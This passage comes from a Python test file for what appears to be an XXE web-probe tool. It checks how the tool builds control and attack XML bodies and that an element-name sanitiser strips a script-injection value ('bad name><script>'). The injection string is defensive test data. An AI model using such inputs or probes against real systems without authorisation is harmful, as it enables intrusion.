    bare_control, bare_attack = build_bodies_for_mode("doctype-entity-xml-body", "", "", {})
    assert bare_attack == FIXED_DOCTYPE_PAYLOAD
    assert bare_control == FIXED_XML_CONTROL_BODY


def test_xml_element_names_are_bounded_against_injection():
    """Element names come from discovered field names, so they must be sanitised."""
    from tools.web_xxe_probe import build_bodies_for_mode, _xml_escape_name

    assert _xml_escape_name("productId") == "productId"
    assert _xml_escape_name("bad name><script>") == "badnamescript"
    assert _xml_escape_name("9lives") == ""
    assert _xml_escape_name("") == ""

    _, attack = build_bodies_for_mode(
        "doctype-entity-xml-body", "productId", "1", {"a<b>c": "x"}
    )
    assert "<script>" not in attack
    assert "<abc>x</abc>" in attack
